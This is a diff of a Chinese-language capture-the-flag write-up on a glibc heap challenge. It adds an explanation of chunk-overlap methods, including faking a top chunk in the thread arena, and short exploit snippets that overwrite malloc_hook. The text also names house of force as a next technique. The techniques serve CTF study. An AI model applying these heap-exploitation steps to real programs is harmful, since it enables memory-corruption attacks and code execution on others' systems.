@@ -19,7 +19,10 @@ menu题目<br>
 1.chunk块在free和malloc的时候没有对立面的内容进行清空，所以很容易可以泄露出main_arena的地址,进而获取libc的基址<br>
 2.由于要使用任意地址写0这个操作，必定要malloc(big_size)，后续的操作都会在t_arena上进行。所以先将chunk移到t_arena上，然后泄露t_arena的基址<br>
 3.这个题目，总共找到了五种解题方法（getshell或者成功写malloc_hook视为解题成功）<br>
-3.1.这个题目一共只能申请三个chunk，使用chunka、chunkb、chunkc代替。思路为使用chunkb修改chunkc的pre_size，pre_size覆盖chunka,chunkb。然后将chunkc的inuse位写0,free(chunkc)达到conslidate(chunka+chunkb+chunkc)的目的，此时chunk
+3.1.这个题目一共只能申请三个chunk，使用chunka、chunkb、chunkc代替。思路为使用chunkb修改chunkc的pre_size，pre_size覆盖chunka,chunkb。然后将chunkc的inuse位写0,free(chunkc)达到conslidate(chunka+chunkb+chunkc)的目的，此时可以通过malloc切割chunkabc来写chunkb
+3.2.和第一种类似，也是将chunkc in use位写0，通过free(chunka)，之后通过unlink 去consolidate(chunkb)，让chunka和chunkb合并。使用malloc切割chunkab来写chunkb<br>
+3.3.修改t_arena中top chunk的地址，在chunka中伪造一个top chunk，在t_arena的top chunk地址最低位写0，这个地址刚好落在chunka内，如果此时在申请一个chunkc，就会造成chunkb和chunkc的overlap，就可以使用chunkc去修改chunkb
+
 
 
 
@@ -104,14 +107,38 @@ chunka+chunkb合并之后放入unsortedbin，作为last chunk，之后申请小�
 ```
 ![3.2.3](img/3.2.3.PNG)<br>
 
-### 3.3.free(chunka) && conslidate(chunka+chunkb)
+### 3.3.修改t_arena里面top chunk的地址，造成chunk之间的overlap
+在chunka里面伪造一个top chunk,让伪造topchunk的地址刚好落在0x7ffff0000900的地方<br>
+在申请一个chunkb，等待被overlap<br>
+```
+  new(0,main_arena,'') #让fastbin和unsortedbin和top chunk全部合并，方便布局
+  new(0,0x70,'A'*0x48+p64(0x20701))
+  new(1,0x60,'B'*0x60)
 
-
-
-
-
-
-
+```
+![3.3.1](img/3.3.1.PNG)<br>
+然后修改t_arena上面top chunk的地址，将最低位写0，由0x7ffff00009a0->0x7ffff0000900<br>
+```
+  new(2,heap_addr-0x78+0x79,'')
+```
+before:<br>
+![3.3.2](img/3.3.2.PNG)<br>
+after:<br>
+![3.3.3](img/3.3.3.PNG)<br>
+此时malloc的时候，就会从0x7ffff0000900的地方申请空间了，这样就会造成新申请的chunkc和chunkb overlap了。<br>
+红色框框里面的就是通过fake top chunk，malloc出来的chunkc<br>
+```
+  malloc_hook=main_arena-0x78+5-0x18
+  new(2,0x40,'a'*0x20+p64(0)+p64(0x75)+p64(malloc_hook))
+```
+![3.3.4](img/3.3.4.PNG)<br>
+new出来搞定,效果图同3.1/3.2<br>
+```
+  new(1,0x68,'')
+  delete(2)
+  new(2,0x68,'A'*19+p64(0xdeedbeef))
+```
+### 3.4.house of force。修改top chunk size,通过malloc 将top chunk size向高地址推进，使用free_hook
 
 
 
